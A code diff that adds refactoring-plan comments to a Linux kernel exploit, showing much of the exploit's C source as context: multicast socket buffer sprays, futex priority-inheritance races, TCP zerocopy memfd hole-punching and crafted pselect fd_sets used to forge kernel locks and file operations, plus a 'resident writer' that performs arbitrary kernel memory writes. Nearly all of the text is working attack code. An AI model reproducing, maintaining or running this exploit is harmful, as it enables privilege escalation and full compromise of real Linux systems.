@@ -2,6 +2,10 @@
 #include <time.h>
 #include <netinet/in.h>
 #include <netinet/tcp.h>
+
+/* Decoupling plan: route-local elapsed-time helper. Input: monotonic reference;
+ * output: elapsed milliseconds. Future: shared_elapsed_ms(const timespec *);
+ * move to the stateless time helper module and make the input const. */
 static double fops_elapsed_ms(struct timespec *ref) {
   struct timespec now;
   clock_gettime(CLOCK_MONOTONIC, &now);
@@ -21,7 +25,13 @@ static atomic_int mr_respray, mr_sprayed, mr_stop, mr_x_done, mr_y_tid;
 static uintptr_t mr_target, mr_value, mr_lock, mr_task;
 static int mr_fd = -1, mr_ready, mr_policy, mr_lock_slot;
 
+/* Decoupling plan: signal hook used only to interrupt the multicast waiter.
+ * Input: signal number; output: none. Future: multicast_waiter_interrupt();
+ * installation and previous-handler ownership move to MulticastWaiterContext. */
 static void mr_intr(int sig) { (void)sig; }
+/* Decoupling plan: toggle the resident multicast waiter's scheduler policy.
+ * Input: implicit waiter TID/policy; output: syscall result. Future:
+ * multicast_waiter_adjust(context), with policy stored in the route context. */
 static long mr_adjust(void) {
   struct sched_param sp = {.sched_priority = 0};
   int next = mr_policy == SCHED_NORMAL ? SCHED_BATCH : SCHED_NORMAL;
@@ -29,6 +39,9 @@ static long mr_adjust(void) {
   mr_policy = next;
   return r;
 }
+/* Decoupling plan: encode and submit one multicast overlap buffer. Inputs:
+ * profile, target, value, lock, task and socket; output: submission status.
+ * Future: multicast_waiter_stamp(context, request), returning structured error. */
 static void mr_stamp(uintptr_t target, uintptr_t value, uintptr_t lock) {
   size_t size = active_offsets->mcast_buffer_size;
   unsigned char b[size];
@@ -40,6 +53,9 @@ static void mr_stamp(uintptr_t target, uintptr_t value, uintptr_t lock) {
   uint16_t family = AF_UNSPEC; memcpy(b + 8, &family, sizeof(family));
   setsockopt(mr_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, b, sizeof(b));
 }
+/* Decoupling plan: multicast waiter/respray worker. Input: currently implicit
+ * mr_* state; output: completion in atomics. Future:
+ * multicast_waiter_worker(void *MulticastWaiterContext), owning its socket. */
 static void *mr_y(void *arg) {
   (void)arg; pin_to_core(CONSUMER_CORE);
   sigset_t set; sigemptyset(&set); sigaddset(&set, SIGUSR1);
@@ -67,6 +83,9 @@ static void *mr_y(void *arg) {
   while (!atomic_load(&mr_x_done)) sched_yield();
   close(mr_fd); mr_fd = -1; return NULL;
 }
+/* Decoupling plan: multicast owner worker. Input: currently implicit mr_* PI
+ * state; output: synchronization flags. Future:
+ * multicast_waiter_owner_worker(void *MulticastWaiterContext). */
 static void *mr_x(void *arg) {
   (void)arg; pin_to_core(CORE);
   while (!atomic_load(&mr_y_l2)) sched_yield();
@@ -77,6 +96,10 @@ static void *mr_x(void *arg) {
   futex_op(&mr_l2, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
   atomic_store(&mr_x_done, 1); return NULL;
 }
+/* Decoupling plan: initialize the long-lived multicast writer. Input: profile,
+ * addresses and CPUs; output: ready/error status. Future:
+ * multicast_waiter_resident_prepare(context, session); kernel version stays in
+ * profile comments rather than the symbol name. */
 int kernel5_resident_start(void) {
   if (mr_ready) return 1;
   uintptr_t bss = data_addr(KIMAGE_TEXT_BASE + active_offsets->off_mcast_fake_bss);
@@ -100,6 +123,9 @@ int kernel5_resident_start(void) {
   pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",bss,mr_lock,mr_task);
   return 1;
 }
+/* Decoupling plan: execute one resident multicast write. Inputs: context plus
+ * target/value; output: route status. Future:
+ * multicast_waiter_resident_execute(context, write_request). */
 int kernel5_resident_write(uintptr_t target, uintptr_t value) {
   if(!mr_ready) return 0; mr_target=target; mr_value=value;
   atomic_store(&mr_sprayed,0); atomic_store(&mr_respray,1);
@@ -107,6 +133,9 @@ int kernel5_resident_write(uintptr_t target, uintptr_t value) {
   long r=mr_adjust(); pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n",value,target,r);
   return r==0;
 }
+/* Decoupling plan: disarm and destroy resident multicast resources. Input:
+ * route/heap contexts; output: clean/disarmed status. Future: split into
+ * multicast_waiter_disarm() and multicast_waiter_destroy(). */
 void kernel5_resident_stop(void) {
   if(!mr_ready) return; atomic_store(&mr_stop,1);
   pthread_join(mr_ty,NULL); pthread_join(mr_tx,NULL); mr_ready=0;
@@ -114,6 +143,9 @@ void kernel5_resident_stop(void) {
   pr_success("5.x resident writer disarmed\n");
 }
 
+/* Decoupling plan: execute the one-shot multicast waiter route. Input: route,
+ * profile, payload and race contexts; output: RouteStatus. Future:
+ * multicast_waiter_execute(); route_last_* becomes the returned status. */
 void do_kernel5_fake_lock_route(void) {
   size_t stamp_size = active_offsets->mcast_buffer_size;
   size_t waiter_off = (size_t)active_offsets->mcast_waiter_off;
@@ -164,6 +196,8 @@ static atomic_int tcp_punch_phase;
 /* errno of the first puncher fallocate that failed; 0 while healthy */
 static atomic_int tcp_punch_failed;
 
+/* Decoupling plan: stop and drain the shared PI consumer. Input: race context;
+ * output: consumer idle. Future: pi_race_stop_consumer(PiRaceContext *). */
 static void tcp_wait_for_consumer_idle(void) {
   atomic_store(&punch_consume_go, 0);
   while (atomic_load(&consumer_inflight)) {
@@ -171,6 +205,9 @@ static void tcp_wait_for_consumer_idle(void) {
   }
 }
 
+/* Decoupling plan: create a connected loopback TCP pair. Input: output slots;
+ * output: 0/-1 and owned descriptors. Future: tcp_zerocopy_open_pair(context),
+ * recording descriptor ownership in TcpZerocopyRouteContext. */
 static int tcp_make_pair(int *client_fd, int *server_fd) {
   int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
   if (listener < 0) {
@@ -227,6 +264,9 @@ static int tcp_make_pair(int *client_fd, int *server_fd) {
   return 0;
 }
 
+/* Decoupling plan: repeatedly fill and punch the zerocopy backing memfd. Input:
+ * punch state plus implicit atomics; output: phase/error flags. Future:
+ * tcp_zerocopy_punch_worker(void *TcpZerocopyRouteContext). */
 static void *tcp_punch_thread(void *arg) {
   disable_rseq_for_thread();
   struct tcp_punch_state *state = arg;
@@ -256,6 +296,9 @@ static void *tcp_punch_thread(void *arg) {
   return NULL;
 }
 
+/* Decoupling plan: prepare, execute and clean the TCP zerocopy route. Input:
+ * session payload/race state; output: RouteStatus. Future: split into
+ * tcp_zerocopy_prepare/execute/disarm/destroy with context-owned resources. */
 void do_tcp_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     route_last_step = 40;
@@ -424,6 +467,9 @@ out:
           route_last_errno);
 }
 
+/* Decoupling plan: choose route timing delay. Input: attempt and eventually
+ * immutable profile; output: microseconds. Future:
+ * select_stack_delay_usec(const TargetProfile *, int). */
 static int route_delay_usec(int attempt) {
   if (!(active_offsets && active_offsets->compact_waiter)) {
     (void)attempt;
@@ -499,11 +545,16 @@ static int pselect_put_global_word(
   }
 }
 
+/* Decoupling plan: read the select-stack waiter layout. Input: profile; output:
+ * word shift. Future: select_stack_waiter_shift(const TargetProfile *). */
 static int pselect_waiter_shift(void) {
   return active_offsets ? active_offsets->pselect_waiter_shift
                         : PSELECT_WAITER_WORD_SHIFT;
 }
 
+/* Decoupling plan: encode a logical waiter word across select fd_sets. Inputs:
+ * layout, sets, word/value; output: placement status. Future:
+ * select_stack_put_waiter_word(layout, sets, ...), without global profile. */
 static void pselect_put_waiter_word(
     fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
     int waiter_word, uint64_t value, const char *name) {
@@ -518,6 +569,9 @@ static void pselect_put_waiter_word(
   }
 }
 
+/* Decoupling plan: materialize descriptors selected by the crafted fd_sets.
+ * Inputs: sets and source fds; output: owned duplicated descriptors. Future:
+ * select_stack_open_fds(SelectStackRouteContext *, const SelectStackSets *). */
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
   /* every bit lands on the read end so select/pselect parks the full window */
@@ -539,6 +593,9 @@ void open_selected_fds(
 
 static int standard_io_backup[3] = {-1, -1, -1};
 
+/* Decoupling plan: preserve standard descriptors before select-stack setup.
+ * Input: route context; output: backup descriptors. Future:
+ * select_stack_backup_stdio(SelectStackRouteContext *). */
 void reserve_standard_io(void) {
   for (int fd = 0; fd < 3; fd++) {
     if (standard_io_backup[fd] >= 0) continue;
@@ -551,6 +608,9 @@ void reserve_standard_io(void) {
   }
 }
 
+/* Decoupling plan: restore standard descriptors from route-owned backups.
+ * Input: route context; output: restored/closed state. Future:
+ * select_stack_restore_stdio(SelectStackRouteContext *). */
 static void restore_standard_io(void) {
   for (int fd = 0; fd < 3; fd++) {
     if (standard_io_backup[fd] < 0) continue;
@@ -558,6 +618,9 @@ static void restore_standard_io(void) {
   }
 }
 
+/* Decoupling plan: build the compact/tree select-stack waiter image. Inputs:
+ * profile, payload layout and write request; output: three fd_sets. Future:
+ * select_stack_build_fdsets(profile, payload, request, result). */
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
   FD_ZERO(out);
@@ -622,6 +685,9 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   }
 }
 
+/* Decoupling plan: prepare, execute and clean the select-stack route. Input:
+ * session payload/race state; output: RouteStatus. Future: split into
+ * select_stack_prepare/execute/disarm/destroy; dirty failures retain ownership. */
 void do_pselect_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     route_last_step = 30;
